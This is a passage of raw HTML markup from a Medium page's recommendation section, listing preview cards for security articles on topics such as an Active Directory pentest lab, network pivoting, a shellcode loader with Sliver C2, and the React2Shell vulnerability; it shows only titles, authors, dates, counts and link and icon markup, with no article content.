Lab for PenTest. Manual Deployment Guide" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*x0k_83ZQ3gz3KTVqHE3BGQ.png"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div><div class="m" aria-describedby="111" aria-labelledby="111" role="tooltip"><div tabindex="-1" class="bf"><a href="https://medium.com/bugbountywriteup?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" rel="noopener follow"><div class="fr"><img alt="InfoSec Write-ups" class="de afw m adi adh" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*SWJxYWGZzgmBP1D0Qg_3zQ.png"><div class="afw m adh adi fw o gj gk"></div></div></a></div></div></div></div><div class="td m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="112" aria-labelledby="112" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" href="https://medium.com/bugbountywriteup?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" rel="noopener follow"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">InfoSec Write-ups</p></a></div></div></div></div><div class="afx m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="113" aria-labelledby="113" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@1200km?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">Andrey Pautov</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><div class="rv ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="114" aria-labelledby="114" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Jan 24</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/bugbountywriteup/active-directory-lab-for-pentest-manual-deployment-guide-cab28cd4ad8d?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div><div class="ac" aria-describedby="222" aria-labelledby="222" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>11</span></div></div></div></div><div><div class="ac" aria-describedby="115" aria-labelledby="115" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>2</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="116" aria-labelledby="116" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fcab28cd4ad8d&amp;operation=register&amp;redirect=https%3A%2F%2Finfosecwriteups.com%2Factive-directory-lab-for-pentest-manual-deployment-guide-cab28cd4ad8d&amp;source=---read_next_recirc--3229b75618f7----0-----------------bookmark_preview----ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="ty bi va lo"></div></div></div></div></div></div></div></div></article></div></div><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-19-network-pivoting-reaching-the-unreachable-bd082b3906a2" tabindex="0"><div class="acp"><div aria-label="30 Days of Red Team: Day 19 — Network Pivoting: Reaching the Unreachable"><div class="acr acs act acu cc"><img alt="30 Days of Red Team: Day 19 — Network Pivoting: Reaching the Unreachable" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*KFHwqIAhrhLp6WjHcWRpbw.png"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div><div class="m" aria-describedby="117" aria-labelledby="117" role="tooltip"><div tabindex="-1" class="bf"><a href="https://medium.com/30-days-of-red-team?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" rel="noopener follow"><div class="fr"><img alt="30 Days of Red Team" class="de afw m adi adh" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*mDDxZ8b9SAK4X34fO8PVLQ.png"><div class="afw m adh adi fw o gj gk"></div></div></a></div></div></div></div><div class="td m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="118" aria-labelledby="118" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" href="https://medium.com/30-days-of-red-team?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" rel="noopener follow"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">30 Days of Red Team</p></a></div></div></div></div><div class="afx m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="119" aria-labelledby="119" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@maxwellcross?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">Maxwell Cross</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><div class="rv ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="120" aria-labelledby="120" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Jan 24</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-19-network-pivoting-reaching-the-unreachable-bd082b3906a2?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div><div class="ac" aria-describedby="224" aria-labelledby="224" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>7</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="121" aria-labelledby="121" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fbd082b3906a2&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F30-days-of-red-team%2F30-days-of-red-team-day-19-network-pivoting-reaching-the-unreachable-bd082b3906a2&amp;source=---read_next_recirc--3229b75618f7----1-----------------bookmark_preview----ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div></div><div class="zo ac kr ji zp zq zr zs zt zu zv zw zx zy zz aba abb abc abd"><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/@luisgerardomoret_69654/using-a-golang-shellcode-loader-with-sliver-c2-for-evasion-43a95f5ebc35" tabindex="0"><div class="acp"><div aria-label="Using a Golang Shellcode Loader with Sliver C2 to Evade Antivirus"><div class="acr acs act acu cc"><img alt="Using a Golang Shellcode Loader with Sliver C2 to Evade Antivirus" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/1*dBX24yL9U5zRKFYVqkjS_g.png"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div class="m"><div><div class="m" aria-describedby="122" aria-labelledby="122" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" rel="noopener follow" href="https://medium.com/@luisgerardomoret_69654?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div class="m fr"><img alt="lainkusanagi" class="m fk by adh adi de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*VzJHRBQO-U0LwAINk4bE1A.png"><div class="gj by m adh adi fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="123" aria-labelledby="123" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@luisgerardomoret_69654?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">lainkusanagi</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><div class="rv ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="124" aria-labelledby="124" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Jan 17</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/@luisgerardomoret_69654/using-a-golang-shellcode-loader-with-sliver-c2-for-evasion-43a95f5ebc35?source=post_page---read_next_recirc--3229b75618f7----0---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div><div class="ac" aria-describedby="225" aria-labelledby="225" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>46</span></div></div></div></div></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="125" aria-labelledby="125" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F43a95f5ebc35&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40luisgerardomoret_69654%2Fusing-a-golang-shellcode-loader-with-sliver-c2-for-evasion-43a95f5ebc35&amp;source=---read_next_recirc--3229b75618f7----0-----------------bookmark_preview----ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="ty bi va lo"></div></div></div></div></div></div></div></div></article></div></div><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/@adityatiwariblogs/react2shell-the-critical-vulnerability-that-shook-the-javascript-world-843647dc5247" tabindex="0"><div class="acp"><div aria-label="React2Shell: The Critical Vulnerability That Shook the JavaScript World"><div class="acr acs act acu cc"><img alt="React2Shell: The Critical Vulnerability That Shook the JavaScript World" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/eca3d3b5fb936ab346077b194b08a6b17f33c89eb76924469d110fa41d232cd3"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div class="m"><div><div class="m" aria-describedby="126" aria-labelledby="126" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" rel="noopener follow" href="https://medium.com/@adityatiwariblogs?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div class="m fr"><img alt="Aditya Kumar Tiwari" class="m fk by adh adi de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*BFLrjGA7JW2WJO7fUQD-_Q.png"><div class="gj by m adh adi fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="127" aria-labelledby="127" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@adityatiwariblogs?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">Aditya Kumar Tiwari</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><div class="rv ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="128" aria-labelledby="128" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Dec 18, 2025</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/@adityatiwariblogs/react2shell-the-critical-vulnerability-that-shook-the-javascript-world-843647dc5247?source=post_page---read_next_recirc--3229b75618f7----1---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"></a></div></div></div><div class="ac r afk afl"><div class="afj"></div><div class=""><div><div class="bn" aria-describedby="129" aria-labelledby="129" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F843647dc5247&amp;operation=register&amp;redirect=https%3A%2F%2Fadityatiwariblogs.medium.com%2Freact2shell-the-critical-vulnerability-that-shook-the-javascript-world-843647dc5247&amp;source=---read_next_recirc--3229b75618f7----1-----------------bookmark_preview----ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><span class="afj"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="ty bi va lo"></div></div></div></div></div></div></div></div></article></div></div><div class="abe abf abg tc abh abi abj tb abk abl abm abn abo abp abq abr abs abt abu abv abw"><div class="abx aby abz aca acb ed m"><article class="ed" data-testid="post-preview"><div class="ed rv m"><div class="bi ed"><div class="ed m"><div class="fr ed acc acd ace acf acg ach aci acj ack acl acm acn aco" role="link" data-href="https://medium.com/meetcyber/the-10-most-dangerous-hacking-devices-d75af50c0122" tabindex="0"><div class="acp"><div aria-label="The 10 Most Dangerous Hacking Devices"><div class="acr acs act acu cc"><img alt="The 10 Most Dangerous Hacking Devices" class="bi acv acw acx bx" loading="lazy" src="https://miro.medium.com/v2/resize:fit:679/format:webp/0*EvUcSFz7nwl2LSWK"></div></div></div><div class="acq ac ci cv"><div class="ac cv xv bi acy acz ada adb"><div class="adc add ade adf adg ac r"><div class="rm m"><div><div class="m" aria-describedby="130" aria-labelledby="130" role="tooltip"><div tabindex="-1" class="bf"><a href="https://medium.com/meetcyber?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" rel="noopener follow"><div class="fr"><img alt="MeetCyber" class="de afw m adi adh" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*Py7yoqD6dCYkTd_BffygCg.png"><div class="afw m adh adi fw o gj gk"></div></div></a></div></div></div></div><div class="td m gc"><p class="bg b ec ab eb">In</p></div><div class="m"><div><div class="m" aria-describedby="131" aria-labelledby="131" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" href="https://medium.com/meetcyber?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" rel="noopener follow"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">MeetCyber</p></a></div></div></div></div><div class="afx m"><p class="bg b ec ab eb">by</p></div><div><div class="m" aria-describedby="132" aria-labelledby="132" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at jg ac r" rel="noopener follow" href="https://medium.com/@theceosmind?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><p class="bg b ec ab ga zc zd ze zf zg zh zi bl">mohandika</p></a></div></div></div></div><div class="adj m adk adl adm adn ado he"></div><span class="bg b ec ab eb"><div class="ss ac cw ag"><div class="ac r afh"><div class="rv ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="133" aria-labelledby="133" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Jan 23</span><div class=""><div class="fr aff do ac r"><div class="fw xb afg ac r afh"><div class="fn do afi m de"></div></div><a class="fw lp afg ac r afh" tabindex="-1" rel="noopener follow" href="https://medium.com/meetcyber/the-10-most-dangerous-hacking-devices-d75af50c0122?source=post_page---read_next_recirc--3229b75618f7----2---------------------ec35bcba_8b43_40e4_bdde_46d7271c90dc--------------" data-discover="true"><div><div class="ac" aria-describedby="226" aria-labelledby="226" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r za"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 